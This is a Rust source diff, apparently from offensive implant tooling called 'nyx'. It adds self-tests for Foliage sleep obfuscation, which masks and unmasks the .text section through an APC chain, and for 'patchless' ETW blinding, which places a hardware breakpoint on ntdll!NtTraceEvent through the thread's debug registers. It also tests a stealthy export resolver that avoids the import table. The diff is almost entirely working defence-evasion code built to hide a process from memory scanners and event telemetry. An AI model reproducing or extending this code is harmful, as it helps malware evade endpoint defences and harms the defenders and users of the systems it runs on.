@@ -1907,11 +1907,15 @@ pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
     crate::sleep::sleep(2); // 2s window: helper masks .text, queues APC, unmasks
     mask |= 1 << 0; // reached the exit → no crash (image survived)
     let st = crate::sleep::foliage_apc_status();
+    let stage = crate::sleep::foliage_stage();
     if st == 1 {
         mask |= 1 << 1; // full APC chain succeeded + .text round-trip verified
     } else if st == 2 {
         mask |= 1 << 2; // attempted but degraded (data-only floor ran)
     }
+    // Encode stage bitmask into upper byte: mask |= (stage as u32) << 8.
+    // Bits 8-14 = FOLIAGE_STAGE bitmask (which stage got to before failure).
+    mask |= (stage as u32) << 8;
     crate::sleep::set_foliage_enabled(false);
     unsafe { exit(mask) };
 }
@@ -1993,3 +1997,263 @@ fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
     }
     false
 }
+
+// ============================================================================
+// HWBP patchless blind: file-diagnostic selftest.
+// Writes single-byte markers to C:\nyx\hwbp_diag.txt at each step so we can
+// see exactly where the crash happens even if the process terminates mid-test.
+// ============================================================================
+
+/// Write a single ASCII marker byte to C:\nyx\hwbp_diag.txt (append mode).
+/// Uses CreateFileW(APPEND) + WriteFile — no std, no format!.
+/// **Gated behind DIAG_ENABLED** — only writes when selftest explicitly enables diagnostics.
+unsafe fn diag_byte(ch: u8) {
+    if !crate::blind_hwbp::DIAG_ENABLED.load(core::sync::atomic::Ordering::Acquire) {
+        return;
+    }
+    // Build wide string "C:\nyx\hwbp_diag.txt"
+    let mut path = [0u16; 22];
+    let name = b"C:\\nyx\\hwbp_diag.txt";
+    let mut i = 0;
+    while i < name.len() {
+        path[i] = name[i] as u16;
+        i += 1;
+    }
+    path[name.len()] = 0;
+
+    type FnCreate = unsafe extern "system" fn(
+        *const u16, u32, u32, *mut core::ffi::c_void, u32, u32, *mut core::ffi::c_void,
+    ) -> *mut core::ffi::c_void;
+    type FnWrite = unsafe extern "system" fn(
+        *mut core::ffi::c_void, *const u8, u32, *mut u32, *mut core::ffi::c_void,
+    ) -> i32;
+    type FnClose = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+    type FnSetFP = unsafe extern "system" fn(*mut core::ffi::c_void, i32, *mut i32, u32) -> u32;
+
+    let Some(cf) = crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW") else { return };
+    let Some(wf) = crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") else { return };
+    let Some(ch_) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") else { return };
+    let create_file: FnCreate = core::mem::transmute(cf);
+    let write_file: FnWrite = core::mem::transmute(wf);
+    let close_handle: FnClose = core::mem::transmute(ch_);
+
+    // OPEN_ALWAYS=4, FILE_SHARE_READ|WRITE=3, FILE_ATTRIBUTE_NORMAL=0x80
+    let h = create_file(path.as_ptr(), 4, 3, core::ptr::null_mut(), 4, 0x80, core::ptr::null_mut());
+    if h as isize == -1 { return; }
+
+    // Seek to end (FILE_END=2).
+    if let Some(sfp) = crate::resolve::export_addr(b"kernel32.dll", b"SetFilePointer") {
+        let set_fp: FnSetFP = core::mem::transmute(sfp);
+        set_fp(h, 0, core::ptr::null_mut(), 2);
+    }
+
+    let byte = [ch];
+    let mut nwritten: u32 = 0;
+    let _ = write_file(h, byte.as_ptr(), 1, &mut nwritten, core::ptr::null_mut());
+    close_handle(h);
+}
+
+// ---- Minimal primitive tests (one step at a time) -----------------------
+
+/// Test 1: Can we resolve kernel32!VirtualAlloc + kernel32!VirtualFree and
+/// alloc+free a page?  Exit 0x11 on failure.
+unsafe fn diag_test_resolve_va_vf() {
+    diag_byte(b'a');
+    let Some(vf) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") else { exit(0x11); };
+    diag_byte(b'b');
+    let Some(vfree) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree") else { exit(0x11); };
+    diag_byte(b'c');
+    type VAlloc = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, u32) -> *mut core::ffi::c_void;
+    type VFree  = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
+    let vaf: VAlloc = core::mem::transmute(vf);
+    let vff: VFree  = core::mem::transmute(vfree);
+    let p = vaf(core::ptr::null_mut(), 4096, 0x3000, 0x04);
+    if p.is_null() { exit(0x12); }
+    diag_byte(b'd');
+    vff(p, 0, 0x8000);
+    diag_byte(b'e');
+}
+
+/// Test 2: NtGetContextThread + NtSetContextThread on NT_CURRENT_THREAD with
+/// CONTEXT_DEBUG_REGISTERS.  Exit 0x2x on failure.
+unsafe fn diag_test_ctx_thread() {
+    type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
+    let Some(ng) = crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") else { exit(0x21); };
+    diag_byte(b'f');
+    let Some(ns) = crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") else { exit(0x21); };
+    diag_byte(b'g');
+    let ntgct: FnCtx = core::mem::transmute(ng);
+    let ntsct: FnCtx = core::mem::transmute(ns);
+    const NT: usize = 0xFFFF_FFFF_FFFF_FFFE;
+
+    // Allocate ctx buffer.
+    let Some(vf) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") else { exit(0x21); };
+    let Some(vf2) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree") else { exit(0x21); };
+    type VAlloc = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, u32) -> *mut core::ffi::c_void;
+    type VFree  = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
+    let vaf: VAlloc = core::mem::transmute(vf);
+    let vff: VFree  = core::mem::transmute(vf2);
+
+    let buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
+    if buf.is_null() { exit(0x22); }
+    diag_byte(b'h');
+    let base = buf as usize;
+    core::ptr::write_bytes(buf as *mut u8, 0, 1232);
+    // ContextFlags = CONTEXT_DEBUG_REGISTERS
+    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
+
+    let st = ntgct(NT, base);
+    if st < 0 {
+        vff(buf, 0, 0x8000);
+        exit(0x23);
+    }
+    diag_byte(b'i');
+
+    // Read DR0 + DR7 to verify.
+    let _dr0 = core::ptr::read_unaligned((base + 0x048) as *const u64);
+    let _dr7 = core::ptr::read_unaligned((base + 0x070) as *const u64);
+    diag_byte(b'j');
+
+    // Set DR0 = some known address, DR7 |= L0.
+    let Some(nt_trace) = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent") else {
+        vff(buf, 0, 0x8000);
+        exit(0x24);
+    };
+    core::ptr::write_unaligned((base + 0x048) as *mut u64, nt_trace as u64);
+    core::ptr::write_unaligned((base + 0x068) as *mut u64, 0u64);
+    core::ptr::write_unaligned((base + 0x070) as *mut u64, (_dr7 | 1) & !(3u64 << 16) & !(3u64 << 18));
+    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
+    diag_byte(b'k');
+
+    let st2 = ntsct(NT, base);
+    if st2 < 0 {
+        vff(buf, 0, 0x8000);
+        exit(0x25);
+    }
+    diag_byte(b'l');
+
+    // Restore: clear DR0, DR7.
+    core::ptr::write_unaligned((base + 0x048) as *mut u64, 0u64);
+    core::ptr::write_unaligned((base + 0x068) as *mut u64, 0u64);
+    core::ptr::write_unaligned((base + 0x070) as *mut u64, 0u64);
+    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
+    let _ = ntsct(NT, base);
+    vff(buf, 0, 0x8000);
+    diag_byte(b'm');
+}
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
+    crate::blind_hwbp::set_diag_enabled(true); // enable diag markers for selftest
+
+    // Minimal test: init shadow + call blind_etw_hwbp → add_hwbp → remove_hwbp.
+    // Markers: 0=entry, 1=shadow_ok, S=add_ok, T=remove_ok, U=count_clean
+    // Error: s + first byte of error string
+    diag_byte(b'0');
+
+    if !crate::blind_hwbp::init_shadow_buffer() {
+        diag_byte(b'!');
+        exit(0xB0);
+    }
+    diag_byte(b'1');
+
+    match crate::blind_hwbp::blind_etw_hwbp() {
+        Ok(slot) => {
+            diag_byte(b'S');
+            if crate::blind_hwbp::remove_hwbp(slot).is_ok() {
+                diag_byte(b'T');
+            }
+            if crate::blind_hwbp::active_count() == 0 {
+                diag_byte(b'U');
+            }
+            diag_byte(b'Z');
+            exit(0xFF);
+        }
+        Err(e) => {
+            diag_byte(b's');
+            // Write first byte of error string as marker.
+            let bytes = e.as_bytes();
+            if !bytes.is_empty() {
+                diag_byte(bytes[0]);
+            }
+            exit(0xC0);
+        }
+    }
+}
+
+/// Minimal no-op VEH handler — returns EXCEPTION_CONTINUE_SEARCH for every
+/// exception. Used by the forwarded-export regression test to register a VEH
+/// without depending on the HWBP handler.
+#[no_mangle]
+pub unsafe extern "system" fn noop_veh_handler(_ep: usize) -> i32 {
+    0 // EXCEPTION_CONTINUE_SEARCH
+}
+
+/// **Forwarded-export resolver regression test**.
+///
+/// Guards the two bugs that caused the hwbp_blind 0xC0000005 crash:
+///  1. `resolve::export_addr_by_hash_pub` sized the forwarder bounds check with
+///     `number_of_functions` (a count) instead of the export-directory *size*,
+///     so high-RVA forwarders escaped detection and were returned as raw
+///     string addresses → calling them AV'd.
+///  2. `resolve::resolve_forwarder` compared the forwarder's abbreviated module
+///     stem (`NTDLL`) against full loader names (`ntdll.dll`), which never
+///     matched → forwarders resolved to `None`.
+///
+/// This test resolves three forwarded kernel32 exports (`AddVectoredException-
+/// Handler` → `NTDLL.RtlAddVectoredExceptionHandler`, plus `Sleep` and
+/// `GetLastError` as control) and calls each. If any resolved address points at
+/// a forwarder *string* instead of code, the call AV's and the test fails. A
+/// successful run exits with the bitmask of the steps that completed:
+///   bit0 = `GetLastError` resolved + called
+///   bit1 = `Sleep` resolved + called
+///   bit2 = `AddVectoredExceptionHandler` resolved + called + removed
+/// Expect 0b111 = 7.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_resolve_forwarder() {
+    let mut mask: u32 = 0;
+
+    // Control: GetLastError (often non-forwarded in kernel32).
+    if let Some(gle) = crate::resolve::export_addr(b"kernel32.dll", b"GetLastError") {
+        type FnGle = unsafe extern "system" fn() -> u32;
+        let f: FnGle = core::mem::transmute(gle);
+        let _ = f();
+        mask |= 1 << 0;
+    }
+
+    // Control: Sleep (frequently forwarded to kernelbase).
+    if let Some(slp) = crate::resolve::export_addr(b"kernel32.dll", b"Sleep") {
+        type FnSleep = unsafe extern "system" fn(u32);
+        let f: FnSleep = core::mem::transmute(slp);
+        f(0);
+        mask |= 1 << 1;
+    }
+
+    // The bug-1/bug-2 case: AddVectoredExceptionHandler forwards to
+    // NTDLL.RtlAddVectoredExceptionHandler at a high RVA. Before the fix this
+    // returned the forwarder *string* address → the call AV'd the process.
+    let Some(aveh) = crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
+        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler"))
+    else {
+        exit(mask);
+    };
+    type AddVEH = unsafe extern "system" fn(
+        usize,
+        unsafe extern "system" fn(usize) -> i32,
+    ) -> *mut core::ffi::c_void;
+    let f: AddVEH = core::mem::transmute(aveh);
+    let h = f(1, noop_veh_handler);
+    if !h.is_null() {
+        if let Some(rveh) = crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
+            .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler"))
+        {
+            type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+            let fr: RemoveVEH = core::mem::transmute(rveh);
+            fr(h);
+            mask |= 1 << 2;
+        }
+    }
+
+    exit(mask);
+}
+
